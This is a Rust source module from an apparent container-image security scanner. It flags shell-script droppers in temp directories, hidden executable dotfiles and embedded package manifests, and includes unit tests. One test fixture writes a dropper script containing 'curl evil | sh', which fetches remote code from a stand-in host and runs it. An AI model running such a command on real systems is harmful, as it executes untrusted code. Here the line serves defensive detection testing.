//! First-slice risk scan over a flattened image filesystem.
//!
//! These checks are intentionally SHALLOW and self-contained — they flag
//! obviously suspicious *paths* using file location + magic-byte sniffing,
//! nothing more. They are NOT a substitute for real capability analysis:
//! deeper per-file / per-package scanning (feeding each captured package to
//! `aegis-ast` + `aegis-heuristics`) is a deliberate follow-up and is noted
//! as out of scope in the crate docs.
//!
//! Current checks:
//!   1. **Dropper in a world-writable / temp location** — a shell script or
//!      ELF binary sitting under `tmp/`, `var/tmp/`, `dev/shm/`, or `run/`.
//!   2. **Hidden executable** — a dotfile (`.foo`) whose bytes are ELF or a
//!      `#!` script, anywhere outside the temp dirs already covered.
//!   3. **Embedded package manifest** — an installed-dependency manifest
//!      (`node_modules/**/package.json`, `vendor/**/composer.json`,
//!      `*.dist-info/METADATA`). Informational: marks where the follow-up
//!      per-package capability scan will attach.

use crate::overlay::ImageFiles;

/// A single risk observation about one path in the image.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// Cleaned path inside the image root filesystem.
    pub path: String,
    /// Human-readable reason the path was flagged.
    pub reason: String,
}

/// Walk the merged filesystem and return findings. Deterministic: input is a
/// `BTreeMap`, so findings come out in path order.
pub fn scan_image_files(files: &ImageFiles) -> Vec<Finding> {
    let mut out = Vec::new();
    for (path, body) in &files.files {
        if let Some(reason) = check_dropper(path, body) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
            continue;
        }
        if let Some(reason) = check_hidden_executable(path, body) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
            continue;
        }
        if let Some(reason) = check_embedded_manifest(path) {
            out.push(Finding {
                path: path.clone(),
                reason,
            });
        }
    }
    out
}

/// A shell script or native binary in a world-writable / temp dir is a
/// classic dropper staging pattern.
fn check_dropper(path: &str, body: &[u8]) -> Option<String> {
    if !is_temp_location(path) {
        return None;
    }
    if path.ends_with(".sh") || is_shebang(body) {
        return Some("shell script in world-writable/temp location (dropper pattern)".to_string());
    }
    if is_elf(body) {
        return Some("ELF binary in world-writable/temp location (dropper pattern)".to_string());
    }
    None
}

/// A hidden dotfile that is actually an executable (ELF or `#!` script) is a
/// common persistence / evasion trick.
fn check_hidden_executable(path: &str, body: &[u8]) -> Option<String> {
    if is_temp_location(path) {
        return None; // already covered by check_dropper
    }
    let base = basename(path);
    if !base.starts_with('.') || base == ".." {
        return None;
    }
    if is_elf(body) {
        return Some("hidden ELF binary (dotfile)".to_string());
    }
    if is_shebang(body) {
        return Some("hidden executable script (dotfile with shebang)".to_string());
    }
    None
}

/// Installed-dependency manifests baked into the image. Informational — this
/// is where the follow-up per-package capability scan will attach.
fn check_embedded_manifest(path: &str) -> Option<String> {
    let base = basename(path);
    match base {
        "package.json" if path.contains("node_modules/") => Some(
            "embedded npm package manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        "composer.json" if path.contains("vendor/") => Some(
            "embedded composer package manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        "METADATA" if path.contains(".dist-info/") => Some(
            "embedded PyPI dist-info manifest (deeper per-package capability scan is a follow-up)"
                .to_string(),
        ),
        _ => None,
    }
}

/// World-writable / temp directories where a dropped executable is suspicious.
fn is_temp_location(path: &str) -> bool {
    const TEMP_PREFIXES: [&str; 4] = ["tmp/", "var/tmp/", "dev/shm/", "run/"];
    TEMP_PREFIXES.iter().any(|p| path.starts_with(p)) || path.contains("/tmp/")
}

fn is_elf(body: &[u8]) -> bool {
    body.len() >= 4 && &body[..4] == b"\x7fELF"
}

fn is_shebang(body: &[u8]) -> bool {
    body.len() >= 2 && &body[..2] == b"#!"
}

fn basename(path: &str) -> &str {
    match path.rsplit_once('/') {
        Some((_, base)) => base,
        None => path,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    /// Build an uncompressed tar blob from `(name, bytes)` entries. Whiteout
    /// markers are just regular entries with a `.wh.` name.
    fn make_tar(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, body) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append_data(&mut header, name, *body).unwrap();
        }
        builder.into_inner().unwrap()
    }

    fn gzip(data: &[u8]) -> Vec<u8> {
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    }

    /// Assemble a `docker save`-style outer tarball: `manifest.json` plus the
    /// named layer blobs.
    fn make_image(manifest: &str, layers: &[(&str, &[u8])]) -> Vec<u8> {
        let mut entries: Vec<(&str, &[u8])> = vec![("manifest.json", manifest.as_bytes())];
        entries.extend(layers.iter().copied());
        make_tar(&entries)
    }

    #[test]
    fn extract_overlays_layers_with_whiteout_and_scans() {
        let elf = b"\x7fELF\x02\x01\x01\x00rest-of-binary";
        // Layer 1: a script that gets whited out later, a dropper in /tmp,
        // an npm manifest, and a plain file.
        let layer1 = make_tar(&[
            ("app/a.sh", b"#!/bin/sh\necho hi\n"),
            ("tmp/dropper.sh", b"#!/bin/sh\ncurl evil | sh\n"),
            (
                "app/node_modules/lodash/package.json",
                br#"{"name":"lodash","version":"4.17.21"}"#,
            ),
            ("app/keep.txt", b"hello"),
        ]);
        // Layer 2 (gzipped, like OCI): whiteout app/a.sh, add a hidden ELF.
        let layer2 = gzip(&make_tar(&[
            ("app/.wh.a.sh", b""),
            ("opt/.hidden-bin", elf),
        ]));

        let manifest = r#"[{"Layers":["layer1.tar","layer2.tar"]}]"#;
        let image = make_image(
            manifest,
            &[("layer1.tar", &layer1), ("layer2.tar", &layer2)],
        );

        let files = crate::extract_image_from_bytes(&image).expect("extract");

        // Merged map: a.sh removed by whiteout, everything else present.
        assert!(
            !files.files.contains_key("app/a.sh"),
            "whiteout should remove app/a.sh"
        );
        assert!(files.files.contains_key("app/keep.txt"));
        assert!(files.files.contains_key("tmp/dropper.sh"));
        assert!(files.files.contains_key("opt/.hidden-bin"));
        assert!(files
            .files
            .contains_key("app/node_modules/lodash/package.json"));
        assert_eq!(
            files.files.get("app/keep.txt").map(|b| b.as_slice()),
            Some(&b"hello"[..])
        );

        let findings = scan_image_files(&files);
        let by_path = |p: &str| findings.iter().find(|f| f.path == p);

        // Dropper in /tmp flagged.
        assert!(
            by_path("tmp/dropper.sh").is_some_and(|f| f.reason.contains("dropper")),
            "expected dropper finding, got {findings:?}"
        );
        // Hidden ELF dotfile flagged.
        assert!(
            by_path("opt/.hidden-bin").is_some_and(|f| f.reason.contains("hidden ELF")),
            "expected hidden ELF finding, got {findings:?}"
        );
        // Embedded npm manifest flagged.
        assert!(
            by_path("app/node_modules/lodash/package.json")
                .is_some_and(|f| f.reason.contains("npm package manifest")),
            "expected embedded manifest finding, got {findings:?}"
        );
        // The whited-out script must NOT produce a finding.
        assert!(by_path("app/a.sh").is_none());
    }

    #[test]
    fn oci_layout_index_json_resolves_layers() {
        let layer = gzip(&make_tar(&[("tmp/x.sh", b"#!/bin/sh\n")]));
        // blob keys are content-addressed; use arbitrary hex here since we
        // control both the manifest digests and the blob paths.
        let manifest_blob = br#"{"layers":[{"digest":"sha256:aaa"}]}"#;
        let index = r#"{"manifests":[{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:bbb"}]}"#;

        let entries: Vec<(&str, &[u8])> = vec![
            ("index.json", index.as_bytes()),
            ("blobs/sha256/bbb", manifest_blob),
            ("blobs/sha256/aaa", &layer),
        ];
        let image = make_tar(&entries);

        let files = crate::extract_image_from_bytes(&image).expect("extract oci");
        assert!(files.files.contains_key("tmp/x.sh"));
        let findings = scan_image_files(&files);
        assert!(findings.iter().any(|f| f.path == "tmp/x.sh"));
    }

    #[test]
    fn malformed_tarball_errors_not_panics() {
        let err = crate::extract_image_from_bytes(b"not a tar at all, definitely garbage");
        assert!(err.is_err());
    }

    #[test]
    fn missing_manifest_errors() {
        let image = make_tar(&[("some/file.txt", b"hi")]);
        let err = crate::extract_image_from_bytes(&image);
        assert!(err.is_err());
    }
}
